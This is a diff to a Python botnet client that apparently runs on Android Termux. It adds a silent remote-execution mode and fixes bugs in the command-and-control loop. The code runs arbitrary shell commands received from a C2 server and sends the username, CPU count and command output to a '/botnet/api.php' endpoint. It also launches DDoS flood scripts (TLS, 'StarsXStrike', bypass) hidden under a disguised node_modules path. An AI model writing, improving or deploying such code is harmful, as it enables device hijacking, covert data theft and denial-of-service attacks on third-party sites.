@@ -19,13 +19,16 @@ def run_background_process(command):
     except Exception as e:
         print(f"Error running background process: {e}")
         return None
-def gas(note):
+def gas(note,stat):
  try:
   user=getpass.getuser()
   corecpu=os.cpu_count()
   output=subprocess.check_output(note, shell=True).decode('utf-8')
   output2=urllib.parse.quote(output)
-  lol.get(f"{endpoint}/botnet/api.php?user={user}:core:{core}:{output2}",timeout=5).text
+  if stat == "silent":
+   lol.get(f"{endpoint}/botnet/api.php?user={user}:core:{corecpu}:DONE-EXEC",timeout=5).text
+  else:
+   lol.get(f"{endpoint}/botnet/api.php?user={user}:core:{corecpu}:{output2}",timeout=5).text
  except:
   print ("oke")
 def attack(note):
@@ -38,7 +41,7 @@ def attack(note):
   if method == "proxy":
    run_background_process(f"node /data/data/com.termux/files/home/.session/fingerprint-generator/data_files/node_modules/es6-handler/adapters/cache/scrape.js")
   elif method == "tls":
-   run_background_proccess(f"node /data/data/com.termux/files/home/.session/fingerprint-generator/data_files/node_modules/es6-handler/adapters/cache/tls.js {url} {time} {rps} {thread} proxy.txt")
+   run_background_process(f"node /data/data/com.termux/files/home/.session/fingerprint-generator/data_files/node_modules/es6-handler/adapters/cache/tls.js {url} {time} {rps} {thread} proxy.txt")
   elif method == "strike":
    run_background_process(f"node /data/data/com.termux/files/home/.session/fingerprint-generator/data_files/node_modules/es6-handler/adapters/cache/StarsXStrike.js GET {url} {time} {thread} {rps} proxy.txt --full")
   elif method == "bypass":
@@ -69,7 +72,9 @@ while True:
    elif tipe == "attack":
     attack(note)
    elif tipe == "exec":
-    gas(note)
+    gas(note,"lol")
+   elif tipe == "exec-silent":
+    gas(note,"silent")
   else:
    time.sleep(2)
  except:
